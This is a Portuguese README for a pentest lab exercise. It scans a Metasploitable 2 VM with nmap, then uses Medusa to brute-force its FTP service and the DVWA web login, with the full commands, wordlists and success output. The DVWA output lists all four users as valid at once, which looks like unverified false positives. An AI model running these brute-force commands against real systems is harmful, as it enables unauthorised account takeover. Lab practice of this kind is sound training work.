# 🛡️ Simulação de Ataques de Força Bruta com Medusa e Kali Linux

Este repositório documenta a implementação prática de testes de invasão (Pentest) em ambiente controlado, utilizando **Kali Linux** como máquina atacante e **Metasploitable 2** como alvo vulnerável, conforme proposto no desafio da **DIO (Digital Innovation One)**.

---

## 🖥️ Configuração do Ambiente

O laboratório foi estruturado utilizando o **Oracle VM VirtualBox** com duas máquinas virtuais comunicando-se exclusivamente através de uma rede isolada (**Host-Only Adapter**), garantindo segurança durante os testes:

- **Máquina Atacante:** Kali Linux
- **Máquina Alvo:** Metasploitable 2 (`192.168.56.102`)
- **Tipo de Rede:** Host-Only (`vboxnet0`)

---

## 🔍 Fase 1: Reconhecimento e Enumeração de Serviços (Nmap)

Antes de executar qualquer tentativa de exploração ou força bruta, foi realizada uma varredura de portas e detecção de versões de serviços utilizando o **Nmap** para mapear a superfície de ataque do alvo.

### Comando Executado:
```bash
nmap -sV 192.168.56.102
```

### Resumo das Portas Encontradas:
* `21/tcp` - ftp (vsftpd 2.3.4)
* `22/tcp` - ssh (OpenSSH 4.7p1)
* `80/tcp` - http (Apache httpd 2.2.8)
* `139/tcp` / `445/tcp` - netbios-ssn (Samba smbd)
* `3306/tcp` - mysql (MySQL 5.0.51a)
* `8180/tcp` - http (Apache Tomcat/Coyote JSP engine 1.1)

> Veja a evidência da varredura na pasta [Images](images/1-find-ports.png).

---

## ⚔️ Fase 2: Ataque de Força Bruta no Serviço FTP (Porta 21)

Utilizando a ferramenta **Medusa**, realizamos um ataque de força bruta contra o serviço FTP (`vsftpd 2.3.4`) mapeado na porta 21 do Metasploitable 2.

### 2.1. Criação das Wordlists
Primeiro, criamos os arquivos contendo os usuários e as senhas candidatas a serem testadas:

* **Arquivo de Usuários (`users.txt`):**
```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

* **Arquivo de Senhas (`pass.txt`):**
```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### 2.2. Execução do Medusa
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
```

### Retorno Obtido (Sucesso):
```text
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-11-15 01:19:42 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

### 2.3. Validação do Acesso
Após identificar as credenciais válidas (`msfadmin` / `msfadmin`), realizamos a conexão direta via cliente FTP:

```bash
ftp 192.168.56.102
```

Evidência da Conexão e Comando `pwd`:
```text
Connected to 192.168.56.102.
220 (vsFTPd 2.3.4)
Name (192.168.56.102:nevola): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /home/msfadmin
```

> Veja a evidência na pasta [Images](images/2-medusa-ftp.png).

---

## 🌐 Fase 3: Ataque de Força Bruta no DVWA (Aplicação Web)

Utilizando a ferramenta **Medusa**, realizamos um teste de força bruta direcionado ao formulário de autenticação da aplicação web vulnerável **DVWA (Damn Vulnerable Web Application)** hospedada na porta 80 do Metasploitable 2.

### 3.1. Execução do Medusa (Módulo HTTP)
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

### 3.2. Retorno Obtido (Sucesso):
```text
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: 123456 [SUCCESS]
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: 123456 [SUCCESS]
```

### 3.3. Análise do Resultado:
Como a aplicação web DVWA no nível de segurança "Low" não implementa bloqueios robustos contra força bruta, o Medusa validou com sucesso as credenciais padrão, demonstrando a criticidade de ambientes mal configurados.

> Veja a evidência na pasta [Images](images/4-acess-form-web.png).
